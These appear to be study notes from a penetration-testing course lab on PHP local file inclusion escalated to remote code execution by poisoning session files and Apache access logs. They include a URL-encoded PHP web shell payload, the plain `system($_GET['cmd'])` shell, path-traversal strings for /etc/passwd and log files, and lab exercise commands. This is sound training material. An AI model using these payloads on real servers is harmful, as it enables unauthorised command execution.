# log poisoning 
>Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.
![[Pasted image 20230305193153.png]]

---
## PHP Session Poisoning
>Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. 

The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a `PHPSESSID` cookie set to our session:

![[Pasted image 20230305193338.png]]
As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

We can see that the session file contains two values: `page`, which shows the selected language page, and `preference`, which shows the selected language. The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.

Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:

Code:
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
![[Pasted image 20230305201345.png]]


Now, let's include the session file once again to look at the contents:

This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
````url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
````
![[Pasted image 20230305201504.png]]
>**Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten**


---
## Server Log Poisoning
>Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs
in old apache servers and nginx servers logs are readable by low priv users such as www 

default apache log file path `/var/log/apache2/access.log` and in `C:\xampp\apache\logs\` on Windows while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.
However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

![[Pasted image 20230305220603.png]]
As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.
![[Pasted image 20230305223403.png]]
As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`?cmd=id`):

![[Pasted image 20230305223435.png]]

**Tip:** 
```
The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
```

-   `/var/log/sshd.log`
-   `/var/log/mail`
-   `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

---
## Exercise

1. **Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd**
2. **Try to use a different technique to gain RCE and read the flag at /**

### 1.

First we test for LFI `/index.php?language=../../../etc/passwd`
![[Pasted image 20230305224218.png]]
now we look for the log files 

we have access to apache log files `../../../var/log/apache2/access.log`
![[Pasted image 20230305224433.png]]
now we poison the logs by changing our User-Agent Header to php code
![[Pasted image 20230305224604.png]]

we have successfully poisoned the logs
`<?php system($_GET['cmd']); ?>`
`../../../var/log/apache2/access.log&cmd=id`
![[Pasted image 20230305224703.png]]
`view-source:http://188.166.150.33:30780/index.php?language=./../../../var/log/apache2/access.log&cmd=ls%20-la%20/`
![[Pasted image 20230305225224.png]]

### 2.
![[Pasted image 20230305225259.png]]
